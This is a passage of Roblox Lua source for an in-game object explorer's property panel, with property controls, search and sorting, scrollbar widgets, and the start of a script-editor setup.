			--dropdown.Parent = frame

			local function update()
				local value = object[propertyName].Name
				propertyLabel.Text = tostring(value)
			end

			update()

			object.Changed:connect(function(property)
				if (property == propertyName) then
					update()
				end
			end)

			return dropdown
		end

		Controls["Object"] = function(object, propertyData, readOnly)
			local propertyName = propertyData["Name"]
			local propertyType = propertyData["ValueType"]

			local box = CreateObject(readOnly,function()end)
			box.Size = UDim2.new(1, -2 * Styles.Margin, 1, 0)
			box.Position = UDim2.new(0, Styles.Margin, 0, 0)

			local function update()
				if AwaitingObjectObj == object then
					if AwaitingObjectValue == true then
						box.Text = "Select an Object"
						return
					end
				end
				local value = object[propertyName]
				box.Text = ToString(value, propertyType)
			end

			if not readOnly then
				box.MouseButton1Click:connect(function()
					if AwaitingObjectValue then
						AwaitingObjectValue = false
						update()
						return
					end
					AwaitingObjectValue = true
					AwaitingObjectObj = object
					AwaitingObjectProp = propertyData
					box.Text = "Select an Object"
				end)

				box.Cancel.Visible = true
				box.Cancel.MouseButton1Click:connect(function()
					object[propertyName] = nil
				end)
			end

			update()

			object.Changed:connect(function(property)
				if (property == propertyName) then
					update()
				end
			end)

			if object:IsA("ObjectValue") then
				object.Changed:connect(function(val)
					update()
				end)
			end

			return box
		end

		function GetControl(object, propertyData, readOnly)
			local propertyType = propertyData["ValueType"]
			local control = nil

			if Controls[propertyType] then
				control = Controls[propertyType](object, propertyData, readOnly)
			elseif RbxApi.IsEnum(propertyType) then
				control = Controls["Enum"](object, propertyData, readOnly)
			else
				control = Controls["default"](object, propertyData, readOnly)
			end
			return control
		end
		-- Permissions

		function CanEditObject(object)
			local player = Players.LocalPlayer
			local character = player.Character
			return Permissions.CanEdit
		end

		function CanEditProperty(object,propertyData)
			local tags = propertyData["tags"]
			for _,name in pairs(tags) do
				if name == "readonly" then
					return false
				end
			end
			return CanEditObject(object)
		end

		--RbxApi
		local function PropertyIsHidden(propertyData)
			local tags = propertyData["tags"]
			for _,name in pairs(tags) do
				if name == "deprecated"
					or name == "hidden"
					or name == "writeonly" then
					return true
				end
			end
			return false
		end

		function Set(object, propertyData, value)
			local propertyName = propertyData["Name"]
			local propertyType = propertyData["ValueType"]

			if value == nil then return end

			for i,v in pairs(GetSelection()) do
				if CanEditProperty(v,propertyData) then
					pcall(function()
						--print("Setting " .. propertyName .. " to " .. tostring(value))
						v[propertyName] = value
					end)
				end
			end
		end

		function CreateRow(object, propertyData, isAlternateRow)
			local propertyName = propertyData["Name"]
			local propertyType = propertyData["ValueType"]
			local propertyValue = object[propertyName]
			--rowValue, rowValueType, isAlternate
			local backColor = Row.BackgroundColor;
			if (isAlternateRow) then
				backColor = Row.BackgroundColorAlternate
			end

			local readOnly = not CanEditProperty(object, propertyData)
			if propertyType == "Instance" or propertyName == "Parent" then readOnly = true end

			local rowFrame = Instance.new("Frame")
			rowFrame.Size = UDim2.new(1,0,0,Row.Height)
			rowFrame.BackgroundTransparency = 1
			rowFrame.Name = 'Row'

			local propertyLabelFrame = CreateCell()
			propertyLabelFrame.Parent = rowFrame
			propertyLabelFrame.ClipsDescendants = true

			local propertyLabel = CreateLabel(readOnly)
			propertyLabel.Text = propertyName
			propertyLabel.Size = UDim2.new(1, -1 * Row.TitleMarginLeft, 1, 0)
			propertyLabel.Position = UDim2.new(0, Row.TitleMarginLeft, 0, 0)
			propertyLabel.Parent = propertyLabelFrame

			local propertyValueFrame = CreateCell()
			propertyValueFrame.Size = UDim2.new(0.5, -1, 1, 0)
			propertyValueFrame.Position = UDim2.new(0.5, 0, 0, 0)
			propertyValueFrame.Parent = rowFrame

			local control = GetControl(object, propertyData, readOnly)
			control.Parent = propertyValueFrame

			rowFrame.MouseEnter:connect(function()
				propertyLabelFrame.BackgroundColor3 = Row.BackgroundColorMouseover
				propertyValueFrame.BackgroundColor3 = Row.BackgroundColorMouseover
			end)
			rowFrame.MouseLeave:connect(function()
				propertyLabelFrame.BackgroundColor3 = backColor
				propertyValueFrame.BackgroundColor3 = backColor
			end)

			propertyLabelFrame.BackgroundColor3 = backColor
			propertyValueFrame.BackgroundColor3 = backColor

			return rowFrame
		end

		function ClearPropertiesList()
			for _,instance in pairs(ContentFrame:GetChildren()) do
				instance:Destroy()
			end
		end

		local selection = Gui:FindFirstChild("Selection", 1)
		print(selection)

		function displayProperties(props)
			for i,v in pairs(props) do
				pcall(function()
					local a = CreateRow(v.object, v.propertyData, ((numRows % 2) == 0))
					a.Position = UDim2.new(0,0,0,numRows*Row.Height)
					a.Parent = ContentFrame
					numRows = numRows + 1
				end)
			end
		end

		function checkForDupe(prop,props)
			for i,v in pairs(props) do
				if v.propertyData.Name == prop.Name and v.propertyData.ValueType == prop.ValueType then
					return true
				end
			end
			return false
		end

		function sortProps(t)
			table.sort(t, 
				function(x,y) return x.propertyData.Name < y.propertyData.Name
				end)
		end

		function showProperties(obj)
			ClearPropertiesList()
			if obj == nil then return end
			local propHolder = {}
			local foundProps = {}
			numRows = 0
			for _,nextObj in pairs(obj) do
				if not foundProps[nextObj.className] then
					foundProps[nextObj.className] = true
					for i,v in pairs(RbxApi.GetProperties(nextObj.className)) do
						local suc, err = pcall(function()
							if not (PropertyIsHidden(v)) and not checkForDupe(v,propHolder) then
								if string.find(string.lower(v.Name),string.lower(propertiesSearch.Text)) or not searchingProperties() then
									table.insert(propHolder,{propertyData = v, object = nextObj})
								end
							end
						end)
				--[[if not suc then 
					warn("Problem getting the value of property " .. v.Name .. " | " .. err)
				end	--]]
					end
				end
			end
			sortProps(propHolder)
			displayProperties(propHolder)
			ContentFrame.Size = UDim2.new(1, 0, 0, numRows * Row.Height)
			scrollBar.ScrollIndex = 0
			scrollBar.TotalSpace = numRows * Row.Height
			scrollBar.Update()
		end

		----------------------------------------------------------------
		-----------------------SCROLLBAR STUFF--------------------------
		----------------------------------------------------------------
		----------------------------------------------------------------
		local ScrollBarWidth = 16

		local ScrollStyles = {
			Background      = Color3.new(233/255, 233/255, 233/255);
			Border          = Color3.new(149/255, 149/255, 149/255);
			Selected        = Color3.new( 63/255, 119/255, 189/255);
			BorderSelected  = Color3.new( 55/255, 106/255, 167/255);
			Text            = Color3.new(  0/255,   0/255,   0/255);
			TextDisabled    = Color3.new(128/255, 128/255, 128/255);
			TextSelected    = Color3.new(255/255, 255/255, 255/255);
			Button          = Color3.new(221/255, 221/255, 221/255);
			ButtonBorder    = Color3.new(149/255, 149/255, 149/255);
			ButtonSelected  = Color3.new(255/255,   0/255,   0/255);
			Field           = Color3.new(255/255, 255/255, 255/255);
			FieldBorder     = Color3.new(191/255, 191/255, 191/255);
			TitleBackground = Color3.new(178/255, 178/255, 178/255);
		}
		do
			local ZIndexLock = {}
			function SetZIndex(object,z)
				if not ZIndexLock[object] then
					ZIndexLock[object] = true
					if object:IsA'GuiObject' then
						object.ZIndex = z
					end
					local children = object:GetChildren()
					for i = 1,#children do
						SetZIndex(children[i],z)
					end
					ZIndexLock[object] = nil
				end
			end
		end
		function SetZIndexOnChanged(object)
			return object.Changed:connect(function(p)
				if p == "ZIndex" then
					SetZIndex(object,object.ZIndex)
				end
			end)
		end
		function Create(ty,data)
			local obj
			if type(ty) == 'string' then
				obj = Instance.new(ty)
			else
				obj = ty
			end
			for k, v in pairs(data) do
				if type(k) == 'number' then
					v.Parent = obj
				else
					obj[k] = v
				end
			end
			return obj
		end
		-- returns the ascendant ScreenGui of an object
		function GetScreen(screen)
			if screen == nil then return nil end
			while not screen:IsA("ScreenGui") do
				screen = screen.Parent
				if screen == nil then return nil end
			end
			return screen
		end
		-- AutoButtonColor doesn't always reset properly
		function ResetButtonColor(button)
			local active = button.Active
			button.Active = not active
			button.Active = active
		end

		function ArrowGraphic(size,dir,scaled,template)
			local Frame = Create('Frame',{
				Name = "Arrow Graphic";
				BorderSizePixel = 0;
				Size = UDim2.new(0,size,0,size);
				Transparency = 1;
			})
			if not template then
				template = Instance.new("Frame")
				template.BorderSizePixel = 0
			end

			local transform
			if dir == nil or dir == 'Up' then
				function transform(p,s) return p,s end
			elseif dir == 'Down' then
				function transform(p,s) return UDim2.new(0,p.X.Offset,0,size-p.Y.Offset-1),s end
			elseif dir == 'Left' then
				function transform(p,s) return UDim2.new(0,p.Y.Offset,0,p.X.Offset),UDim2.new(0,s.Y.Offset,0,s.X.Offset) end
			elseif dir == 'Right' then
				function transform(p,s) return UDim2.new(0,size-p.Y.Offset-1,0,p.X.Offset),UDim2.new(0,s.Y.Offset,0,s.X.Offset) end
			end

			local scale
			if scaled then
				function scale(p,s) return UDim2.new(p.X.Offset/size,0,p.Y.Offset/size,0),UDim2.new(s.X.Offset/size,0,s.Y.Offset/size,0) end
			else
				function scale(p,s) return p,s end
			end

			local o = math.floor(size/4)
			if size%2 == 0 then
				local n = size/2-1
				for i = 0,n do
					local t = template:Clone()
					local p,s = scale(transform(
						UDim2.new(0,n-i,0,o+i),
						UDim2.new(0,(i+1)*2,0,1)
						))
					t.Position = p
					t.Size = s
					t.Parent = Frame
				end
			else
				local n = (size-1)/2
				for i = 0,n do
					local t = template:Clone()
					local p,s = scale(transform(
						UDim2.new(0,n-i,0,o+i),
						UDim2.new(0,i*2+1,0,1)
						))
					t.Position = p
					t.Size = s
					t.Parent = Frame
				end
			end
			if size%4 > 1 then
				local t = template:Clone()
				local p,s = scale(transform(
					UDim2.new(0,0,0,size-o-1),
					UDim2.new(0,size,0,1)
					))
				t.Position = p
				t.Size = s
				t.Parent = Frame
			end
			return Frame
		end

		function GripGraphic(size,dir,spacing,scaled,template)
			local Frame = Create('Frame',{
				Name = "Grip Graphic";
				BorderSizePixel = 0;
				Size = UDim2.new(0,size.x,0,size.y);
				Transparency = 1;
			})
			if not template then
				template = Instance.new("Frame")
				template.BorderSizePixel = 0
			end

			spacing = spacing or 2

			local scale
			if scaled then
				function scale(p) return UDim2.new(p.X.Offset/size.x,0,p.Y.Offset/size.y,0) end
			else
				function scale(p) return p end
			end

			if dir == 'Vertical' then
				for i=0,size.x-1,spacing do
					local t = template:Clone()
					t.Size = scale(UDim2.new(0,1,0,size.y))
					t.Position = scale(UDim2.new(0,i,0,0))
					t.Parent = Frame
				end
			elseif dir == nil or dir == 'Horizontal' then
				for i=0,size.y-1,spacing do
					local t = template:Clone()
					t.Size = scale(UDim2.new(0,size.x,0,1))
					t.Position = scale(UDim2.new(0,0,0,i))
					t.Parent = Frame
				end
			end

			return Frame
		end

		do
			local mt = {
				__index = {
					GetScrollPercent = function(self)
						return self.ScrollIndex/(self.TotalSpace-self.VisibleSpace)
					end;
					CanScrollDown = function(self)
						return self.ScrollIndex + self.VisibleSpace < self.TotalSpace
					end;
					CanScrollUp = function(self)
						return self.ScrollIndex > 0
					end;
					ScrollDown = function(self)
						self.ScrollIndex = self.ScrollIndex + self.PageIncrement
						self:Update()
					end;
					ScrollUp = function(self)
						self.ScrollIndex = self.ScrollIndex - self.PageIncrement
						self:Update()
					end;
					ScrollTo = function(self,index)
						self.ScrollIndex = index
						self:Update()
					end;
					SetScrollPercent = function(self,percent)
						self.ScrollIndex = math.floor((self.TotalSpace - self.VisibleSpace)*percent + 0.5)
						self:Update()
					end;
				};
			}
			mt.__index.CanScrollRight = mt.__index.CanScrollDown
			mt.__index.CanScrollLeft = mt.__index.CanScrollUp
			mt.__index.ScrollLeft = mt.__index.ScrollUp
			mt.__index.ScrollRight = mt.__index.ScrollDown

			function ScrollBar(horizontal)
				-- create row scroll bar
				local ScrollFrame = Create('Frame',{
					Name = "ScrollFrame";
					Position = horizontal and UDim2.new(0,0,1,-ScrollBarWidth) or UDim2.new(1,-ScrollBarWidth,0,0);
					Size = horizontal and UDim2.new(1,0,0,ScrollBarWidth) or UDim2.new(0,ScrollBarWidth,1,0);
					BackgroundTransparency = 1;
					Create('ImageButton',{
						Name = "ScrollDown";
						Position = horizontal and UDim2.new(1,-ScrollBarWidth,0,0) or UDim2.new(0,0,1,-ScrollBarWidth);
						Size = UDim2.new(0, ScrollBarWidth, 0, ScrollBarWidth);
						BackgroundColor3 = ScrollStyles.Button;
						BorderColor3 = ScrollStyles.Border;
						--BorderSizePixel = 0;
					});
					Create('ImageButton',{
						Name = "ScrollUp";
						Size = UDim2.new(0, ScrollBarWidth, 0, ScrollBarWidth);
						BackgroundColor3 = ScrollStyles.Button;
						BorderColor3 = ScrollStyles.Border;
						--BorderSizePixel = 0;
					});
					Create('ImageButton',{
						Name = "ScrollBar";
						Size = horizontal and UDim2.new(1,-ScrollBarWidth*2,1,0) or UDim2.new(1,0,1,-ScrollBarWidth*2);
						Position = horizontal and UDim2.new(0,ScrollBarWidth,0,0) or UDim2.new(0,0,0,ScrollBarWidth);
						AutoButtonColor = false;
						BackgroundColor3 = Color3.new(0.94902, 0.94902, 0.94902);
						BorderColor3 = ScrollStyles.Border;
						--BorderSizePixel = 0;
						Create('ImageButton',{
							Name = "ScrollThumb";
							AutoButtonColor = false;
							Size = UDim2.new(0, ScrollBarWidth, 0, ScrollBarWidth);
							BackgroundColor3 = ScrollStyles.Button;
							BorderColor3 = ScrollStyles.Border;
							--BorderSizePixel = 0;
						});
					});
				})

				local graphicTemplate = Create('Frame',{
					Name="Graphic";
					BorderSizePixel = 0;
					BackgroundColor3 = ScrollStyles.Border;
				})
				local graphicSize = ScrollBarWidth/2

				local ScrollDownFrame = ScrollFrame.ScrollDown
				local ScrollDownGraphic = ArrowGraphic(graphicSize,horizontal and 'Right' or 'Down',true,graphicTemplate)
				ScrollDownGraphic.Position = UDim2.new(0.5,-graphicSize/2,0.5,-graphicSize/2)
				ScrollDownGraphic.Parent = ScrollDownFrame
				local ScrollUpFrame = ScrollFrame.ScrollUp
				local ScrollUpGraphic = ArrowGraphic(graphicSize,horizontal and 'Left' or 'Up',true,graphicTemplate)
				ScrollUpGraphic.Position = UDim2.new(0.5,-graphicSize/2,0.5,-graphicSize/2)
				ScrollUpGraphic.Parent = ScrollUpFrame
				local ScrollBarFrame = ScrollFrame.ScrollBar
				local ScrollThumbFrame = ScrollBarFrame.ScrollThumb
				do
					local size = ScrollBarWidth*3/8
					local Decal = GripGraphic(Vector2.new(size,size),horizontal and 'Vertical' or 'Horizontal',2,graphicTemplate)
					Decal.Position = UDim2.new(0.5,-size/2,0.5,-size/2)
					Decal.Parent = ScrollThumbFrame
				end

				local MouseDrag = Create('ImageButton',{
					Name = "MouseDrag";
					Position = UDim2.new(-0.25,0,-0.25,0);
					Size = UDim2.new(1.5,0,1.5,0);
					Transparency = 1;
					AutoButtonColor = false;
					Active = true;
					ZIndex = 10;
				})

				local Class = setmetatable({
					GUI = ScrollFrame;
					ScrollIndex = 0;
					VisibleSpace = 0;
					TotalSpace = 0;
					PageIncrement = 1;
				},mt)

				local UpdateScrollThumb
				if horizontal then
					function UpdateScrollThumb()
						ScrollThumbFrame.Size = UDim2.new(Class.VisibleSpace/Class.TotalSpace,0,0,ScrollBarWidth)
						if ScrollThumbFrame.AbsoluteSize.x < ScrollBarWidth then
							ScrollThumbFrame.Size = UDim2.new(0,ScrollBarWidth,0,ScrollBarWidth)
						end
						local barSize = ScrollBarFrame.AbsoluteSize.x
						ScrollThumbFrame.Position = UDim2.new(Class:GetScrollPercent()*(barSize - ScrollThumbFrame.AbsoluteSize.x)/barSize,0,0,0)
					end
				else
					function UpdateScrollThumb()
						ScrollThumbFrame.Size = UDim2.new(0,ScrollBarWidth,Class.VisibleSpace/Class.TotalSpace,0)
						if ScrollThumbFrame.AbsoluteSize.y < ScrollBarWidth then
							ScrollThumbFrame.Size = UDim2.new(0,ScrollBarWidth,0,ScrollBarWidth)
						end
						local barSize = ScrollBarFrame.AbsoluteSize.y
						ScrollThumbFrame.Position = UDim2.new(0,0,Class:GetScrollPercent()*(barSize - ScrollThumbFrame.AbsoluteSize.y)/barSize,0)
					end
				end

				local lastDown
				local lastUp
				local scrollStyle = {BackgroundColor3=ScrollStyles.Border,BackgroundTransparency=0}
				local scrollStyle_ds = {BackgroundColor3=ScrollStyles.Border,BackgroundTransparency=0.7}

				local function Update()
					local t = Class.TotalSpace
					local v = Class.VisibleSpace
					local s = Class.ScrollIndex
					if v <= t then
						if s > 0 then
							if s + v > t then
								Class.ScrollIndex = t - v
							end
						else
							Class.ScrollIndex = 0
						end
					else
						Class.ScrollIndex = 0
					end

					if Class.UpdateCallback then
						if Class.UpdateCallback(Class) == false then
							return
						end
					end

					local down = Class:CanScrollDown()
					local up = Class:CanScrollUp()
					if down ~= lastDown then
						lastDown = down
						ScrollDownFrame.Active = down
						ScrollDownFrame.AutoButtonColor = down
						local children = ScrollDownGraphic:GetChildren()
						local style = down and scrollStyle or scrollStyle_ds
						for i = 1,#children do
							Create(children[i],style)
						end
					end
					if up ~= lastUp then
						lastUp = up
						ScrollUpFrame.Active = up
						ScrollUpFrame.AutoButtonColor = up
						local children = ScrollUpGraphic:GetChildren()
						local style = up and scrollStyle or scrollStyle_ds
						for i = 1,#children do
							Create(children[i],style)
						end
					end
					ScrollThumbFrame.Visible = down or up
					UpdateScrollThumb()
				end
				Class.Update = Update

				SetZIndexOnChanged(ScrollFrame)

				local scrollEventID = 0
				ScrollDownFrame.MouseButton1Down:connect(function()
					scrollEventID = tick()
					local current = scrollEventID
					local up_con
					up_con = MouseDrag.MouseButton1Up:connect(function()
						scrollEventID = tick()
						MouseDrag.Parent = nil
						ResetButtonColor(ScrollDownFrame)
						up_con:disconnect(); drag = nil
					end)
					MouseDrag.Parent = GetScreen(ScrollFrame)
					Class:ScrollDown()
					wait(0.2) -- delay before auto scroll
					while scrollEventID == current do
						Class:ScrollDown()
						if not Class:CanScrollDown() then break end
						wait()
					end
				end)

				ScrollDownFrame.MouseButton1Up:connect(function()
					scrollEventID = tick()
				end)

				ScrollUpFrame.MouseButton1Down:connect(function()
					scrollEventID = tick()
					local current = scrollEventID
					local up_con
					up_con = MouseDrag.MouseButton1Up:connect(function()
						scrollEventID = tick()
						MouseDrag.Parent = nil
						ResetButtonColor(ScrollUpFrame)
						up_con:disconnect(); drag = nil
					end)
					MouseDrag.Parent = GetScreen(ScrollFrame)
					Class:ScrollUp()
					wait(0.2)
					while scrollEventID == current do
						Class:ScrollUp()
						if not Class:CanScrollUp() then break end
						wait()
					end
				end)

				ScrollUpFrame.MouseButton1Up:connect(function()
					scrollEventID = tick()
				end)

				if horizontal then
					ScrollBarFrame.MouseButton1Down:connect(function(x,y)
						scrollEventID = tick()
						local current = scrollEventID
						local up_con
						up_con = MouseDrag.MouseButton1Up:connect(function()
							scrollEventID = tick()
							MouseDrag.Parent = nil
							ResetButtonColor(ScrollUpFrame)
							up_con:disconnect(); drag = nil
						end)
						MouseDrag.Parent = GetScreen(ScrollFrame)
						if x > ScrollThumbFrame.AbsolutePosition.x then
							Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
							wait(0.2)
							while scrollEventID == current do
								if x < ScrollThumbFrame.AbsolutePosition.x + ScrollThumbFrame.AbsoluteSize.x then break end
								Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
								wait()
							end
						else
							Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
							wait(0.2)
							while scrollEventID == current do
								if x > ScrollThumbFrame.AbsolutePosition.x then break end
								Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
								wait()
							end
						end
					end)
				else
					ScrollBarFrame.MouseButton1Down:connect(function(x,y)
						scrollEventID = tick()
						local current = scrollEventID
						local up_con
						up_con = MouseDrag.MouseButton1Up:connect(function()
							scrollEventID = tick()
							MouseDrag.Parent = nil
							ResetButtonColor(ScrollUpFrame)
							up_con:disconnect(); drag = nil
						end)
						MouseDrag.Parent = GetScreen(ScrollFrame)
						if y > ScrollThumbFrame.AbsolutePosition.y then
							Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
							wait(0.2)
							while scrollEventID == current do
								if y < ScrollThumbFrame.AbsolutePosition.y + ScrollThumbFrame.AbsoluteSize.y then break end
								Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
								wait()
							end
						else
							Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
							wait(0.2)
							while scrollEventID == current do
								if y > ScrollThumbFrame.AbsolutePosition.y then break end
								Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
								wait()
							end
						end
					end)
				end

				if horizontal then
					ScrollThumbFrame.MouseButton1Down:connect(function(x,y)
						scrollEventID = tick()
						local mouse_offset = x - ScrollThumbFrame.AbsolutePosition.x
						local drag_con
						local up_con
						drag_con = MouseDrag.MouseMoved:connect(function(x,y)
							local bar_abs_pos = ScrollBarFrame.AbsolutePosition.x
							local bar_drag = ScrollBarFrame.AbsoluteSize.x - ScrollThumbFrame.AbsoluteSize.x
							local bar_abs_one = bar_abs_pos + bar_drag
							x = x - mouse_offset
							x = x < bar_abs_pos and bar_abs_pos or x > bar_abs_one and bar_abs_one or x
							x = x - bar_abs_pos
							Class:SetScrollPercent(x/(bar_drag))
						end)
						up_con = MouseDrag.MouseButton1Up:connect(function()
							scrollEventID = tick()
							MouseDrag.Parent = nil
							ResetButtonColor(ScrollThumbFrame)
							drag_con:disconnect(); drag_con = nil
							up_con:disconnect(); drag = nil
						end)
						MouseDrag.Parent = GetScreen(ScrollFrame)
					end)
				else
					ScrollThumbFrame.MouseButton1Down:connect(function(x,y)
						scrollEventID = tick()
						local mouse_offset = y - ScrollThumbFrame.AbsolutePosition.y
						local drag_con
						local up_con
						drag_con = MouseDrag.MouseMoved:connect(function(x,y)
							local bar_abs_pos = ScrollBarFrame.AbsolutePosition.y
							local bar_drag = ScrollBarFrame.AbsoluteSize.y - ScrollThumbFrame.AbsoluteSize.y
							local bar_abs_one = bar_abs_pos + bar_drag
							y = y - mouse_offset
							y = y < bar_abs_pos and bar_abs_pos or y > bar_abs_one and bar_abs_one or y
							y = y - bar_abs_pos
							Class:SetScrollPercent(y/(bar_drag))
						end)
						up_con = MouseDrag.MouseButton1Up:connect(function()
							scrollEventID = tick()
							MouseDrag.Parent = nil
							ResetButtonColor(ScrollThumbFrame)
							drag_con:disconnect(); drag_con = nil
							up_con:disconnect(); drag = nil
						end)
						MouseDrag.Parent = GetScreen(ScrollFrame)
					end)
				end

				function Class:Destroy()
					ScrollFrame:Destroy()
					MouseDrag:Destroy()
					for k in pairs(Class) do
						Class[k] = nil
					end
					setmetatable(Class,nil)
				end

				Update()

				return Class
			end
		end

		----------------------------------------------------------------
		----------------------------------------------------------------
		----------------------------------------------------------------
		----------------------------------------------------------------

		local MainFrame = Instance.new("Frame")
		MainFrame.Name = "MainFrame"
		MainFrame.Size = UDim2.new(1, -1 * ScrollBarWidth, 1, 0)
		MainFrame.Position = UDim2.new(0, 0, 0, 0)
		MainFrame.BackgroundTransparency = 1
		MainFrame.ClipsDescendants = true
		MainFrame.Parent = PropertiesFrame

		ContentFrame = Instance.new("Frame")
		ContentFrame.Name = "ContentFrame"
		ContentFrame.Size = UDim2.new(1, 0, 0, 0)
		ContentFrame.BackgroundTransparency = 1
		ContentFrame.Parent = MainFrame

		scrollBar = ScrollBar(false)
		scrollBar.PageIncrement = 1
		Create(scrollBar.GUI,{
			Position = UDim2.new(1,-ScrollBarWidth,0,0);
			Size = UDim2.new(0,ScrollBarWidth,1,0);
			Parent = PropertiesFrame;
		})

		scrollBarH = ScrollBar(true)
		scrollBarH.PageIncrement = ScrollBarWidth
		Create(scrollBarH.GUI,{
			Position = UDim2.new(0,0,1,-ScrollBarWidth);
			Size = UDim2.new(1,-ScrollBarWidth,0,ScrollBarWidth);
			Visible = false;
			Parent = PropertiesFrame;
		})

		do
			local listEntries = {}
			local nameConnLookup = {}

			function scrollBar.UpdateCallback(self)
				scrollBar.TotalSpace = ContentFrame.AbsoluteSize.Y
				scrollBar.VisibleSpace = MainFrame.AbsoluteSize.Y
				ContentFrame.Position = UDim2.new(ContentFrame.Position.X.Scale,ContentFrame.Position.X.Offset,0,-1*scrollBar.ScrollIndex)
			end

			function scrollBarH.UpdateCallback(self)

			end

			MainFrame.Changed:connect(function(p)
				if p == 'AbsoluteSize' then
					scrollBarH.VisibleSpace = math.ceil(MainFrame.AbsoluteSize.x)
					scrollBarH:Update()
					scrollBar.VisibleSpace = math.ceil(MainFrame.AbsoluteSize.y)
					scrollBar:Update()
				end
			end)

			local wheelAmount = Row.Height
			PropertiesFrame.MouseWheelForward:connect(function()
				if scrollBar.VisibleSpace - 1 > wheelAmount then
					scrollBar:ScrollTo(scrollBar.ScrollIndex - wheelAmount)
				else
					scrollBar:ScrollTo(scrollBar.ScrollIndex - scrollBar.VisibleSpace)
				end
			end)
			PropertiesFrame.MouseWheelBackward:connect(function()
				if scrollBar.VisibleSpace - 1 > wheelAmount then
					scrollBar:ScrollTo(scrollBar.ScrollIndex + wheelAmount)
				else
					scrollBar:ScrollTo(scrollBar.ScrollIndex + scrollBar.VisibleSpace)
				end
			end)
		end

		scrollBar.VisibleSpace = math.ceil(MainFrame.AbsoluteSize.y)
		scrollBar:Update()

		showProperties(GetSelection())

		bindSelectionChanged.Event:connect(function()
			showProperties(GetSelection())
		end)

		bindSetAwait.Event:connect(function(obj)
			if AwaitingObjectValue then
				AwaitingObjectValue = false
				local mySel = obj
				if mySel then
					pcall(function()
						Set(AwaitingObjectObj, AwaitingObjectProp, mySel)
					end)
				end
			end
		end)

		propertiesSearch.Changed:connect(function(prop)
			if prop == "Text" then
				showProperties(GetSelection())
			end
		end)

		bindGetApi.OnInvoke = function()
			return RbxApi
		end

		bindGetAwait.OnInvoke = function()
			return AwaitingObjectValue
		end
	end)
	spawn(function()
		local top = D_E_X.ScriptEditor

		local editorGrid = top:WaitForChild("EditorGrid")

		local currentSource = ""

		local currentEditor = {
			x = 0,
			y = 0
		}

		local userInput = game:GetService("UserInputService")
		local mouse = game.Players.LocalPlayer:GetMouse()

		local topBar = top:WaitForChild("TopBar")
		local scriptBar = topBar:WaitForChild("ScriptBar")
		local scriptBarLeft = topBar:WaitForChild("ScriptBarLeft")
		local scriptBarRight = topBar:WaitForChild("ScriptBarRight")
		local clipboardButton = topBar:WaitForChild("Clipboard")

		local entryTemplate = topBar:WaitForChild("Entry")

		local openEvent = top:WaitForChild("OpenScript")

		local closeButton = top:WaitForChild("Close")

		local memoryScripts = {}

		local editingIndex = 0

		-- Scrollbar

		local ScrollBarWidth = 16

		local ScrollStyles = {
			Background      = Color3.new(233/255, 233/255, 233/255);
			Border          = Color3.new(149/255, 149/255, 149/255);
			Selected        = Color3.new( 63/255, 119/255, 189/255);
			BorderSelected  = Color3.new( 55/255, 106/255, 167/255);
			Text            = Color3.new(  0/255,   0/255,   0/255);
			TextDisabled    = Color3.new(128/255, 128/255, 128/255);
			TextSelected    = Color3.new(255/255, 255/255, 255/255);
			Button          = Color3.new(221/255, 221/255, 221/255);
			ButtonBorder    = Color3.new(149/255, 149/255, 149/255);
			ButtonSelected  = Color3.new(255/255,   0/255,   0/255);
			Field           = Color3.new(255/255, 255/255, 255/255);
			FieldBorder     = Color3.new(191/255, 191/255, 191/255);
			TitleBackground = Color3.new(178/255, 178/255, 178/255);
		}
		do
			local ZIndexLock = {}
			function SetZIndex(object,z)
				if not ZIndexLock[object] then
					ZIndexLock[object] = true
					if object:IsA'GuiObject' then
						object.ZIndex = z
					end
					local children = object:GetChildren()
					for i = 1,#children do
						SetZIndex(children[i],z)
					end
					ZIndexLock[object] = nil
				end
			end
		end
		function SetZIndexOnChanged(object)
			return object.Changed:connect(function(p)
				if p == "ZIndex" then
					SetZIndex(object,object.ZIndex)
				end
			end)
		end
		function Create(ty,data)
			local obj
			if type(ty) == 'string' then
				obj = Instance.new(ty)
			else
				obj = ty
			end
			for k, v in pairs(data) do
				if type(k) == 'number' then
					v.Parent = obj
				else
					obj[k] = v
				end
			end
			return obj
		end
		-- returns the ascendant ScreenGui of an object
		function GetScreen(screen)
			if screen == nil then return nil end
			while not screen:IsA("ScreenGui") do
				screen = screen.Parent
				if screen == nil then return nil end
			end
			return screen
		end
		-- AutoButtonColor doesn't always reset properly
		function ResetButtonColor(button)
			local active = button.Active
			button.Active = not active
			button.Active = active
		end

		function ArrowGraphic(size,dir,scaled,template)
			local Frame = Create('Frame',{
				Name = "Arrow Graphic";
				BorderSizePixel = 0;
				Size = UDim2.new(0,size,0,size);
				Transparency = 1;
			})
			if not template then
				template = Instance.new("Frame")
				template.BorderSizePixel = 0
			end

			local transform
			if dir == nil or dir == 'Up' then
				function transform(p,s) return p,s end
			elseif dir == 'Down' then
				function transform(p,s) return UDim2.new(0,p.X.Offset,0,size-p.Y.Offset-1),s end
			elseif dir == 'Left' then
				function transform(p,s) return UDim2.new(0,p.Y.Offset,0,p.X.Offset),UDim2.new(0,s.Y.Offset,0,s.X.Offset) end
			elseif dir == 'Right' then
				function transform(p,s) return UDim2.new(0,size-p.Y.Offset-1,0,p.X.Offset),UDim2.new(0,s.Y.Offset,0,s.X.Offset) end
			end

			local scale
			if scaled then
				function scale(p,s) return UDim2.new(p.X.Offset/size,0,p.Y.Offset/size,0),UDim2.new(s.X.Offset/size,0,s.Y.Offset/size,0) end
			else
				function scale(p,s) return p,s end
			end

			local o = math.floor(size/4)
			if size%2 == 0 then
				local n = size/2-1
				for i = 0,n do
					local t = template:Clone()
					local p,s = scale(transform(
						UDim2.new(0,n-i,0,o+i),
						UDim2.new(0,(i+1)*2,0,1)
						))
					t.Position = p
					t.Size = s
					t.Parent = Frame
				end
			else
				local n = (size-1)/2
				for i = 0,n do
					local t = template:Clone()
					local p,s = scale(transform(
						UDim2.new(0,n-i,0,o+i),
						UDim2.new(0,i*2+1,0,1)
						))
					t.Position = p
					t.Size = s
					t.Parent = Frame
				end
			end
			if size%4 > 1 then
				local t = template:Clone()
				local p,s = scale(transform(
					UDim2.new(0,0,0,size-o-1),
					UDim2.new(0,size,0,1)
